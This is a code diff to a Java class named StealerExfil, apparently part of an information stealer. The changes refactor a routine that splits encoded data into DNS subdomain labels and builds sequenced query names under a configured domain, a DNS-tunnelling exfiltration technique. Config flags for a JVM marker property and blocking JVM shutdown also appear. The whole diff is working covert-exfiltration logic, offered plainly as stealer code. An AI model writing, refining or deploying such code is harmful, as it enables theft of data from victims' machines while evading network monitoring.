@@ -9,6 +9,7 @@ import java.util.*;
 public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
     public static final String TOKEN_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.:,;<>|!\"#¤%&/()=+?`'^~'*@()[]{} \n\\";
     public static final String URL_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789";
+    private static final int MAX_SEQNO_LEN = 5;
 
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
@@ -204,11 +205,14 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         if (!baseDomain.startsWith(".")) {
             baseDomain = "." + baseDomain;
         }
-        if (uniqueId.length() + 5 + baseDomain.length() >= CONF_FQDN_MAX_LEN - CONF_SUBDOMAIN_MAX_LEN) {
-            return Collections.emptyList(); // Not a very good error handling
+        int overheadLength = 1 + uniqueId.length() + 1 + MAX_SEQNO_LEN + 1 + baseDomain.length();
+        if (overheadLength > CONF_FQDN_MAX_LEN) {
+            // Throw an exception that will never be seen...
+            throw new RuntimeException("CONF_FQDN_MAX_LEN too short for the value of CONF_DOMAIN!");
         }
 
-        List<String> splits = new LinkedList<>();
+        // Split encoded data into subdomains
+        LinkedList<String> splits = new LinkedList<>();
         while (!encodedData.isEmpty()) {
             if (encodedData.length() > CONF_SUBDOMAIN_MAX_LEN) {
                 String subdomain = encodedData.substring(0, CONF_SUBDOMAIN_MAX_LEN);
@@ -220,21 +224,23 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
             }
         }
 
+        // Split subdomains into requests
         StringBuilder request = new StringBuilder();
         int sequenceNumber = 0;
         request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);
-        Collections.reverse(splits);    // TODO Come up with something more elegant than this
-        for (String split : splits) {
+        Iterator<String> reverse = splits.descendingIterator();
+        while (reverse.hasNext()) {
+            String split = reverse.next();
             if (split.length() + ".".length() + request.length() > CONF_FQDN_MAX_LEN) {
                 // This DNS request is full. Finalize it and begin on a new one.
                 requests.add(request.toString());
                 request = new StringBuilder();
-                request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);
+                request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);   // Code dup
             }
 
             request.insert(0, split + ".");
         }
-        requests.add(request.toString());   // TODO Sloppy
+        requests.add(request.toString());
 
         return requests;
     }
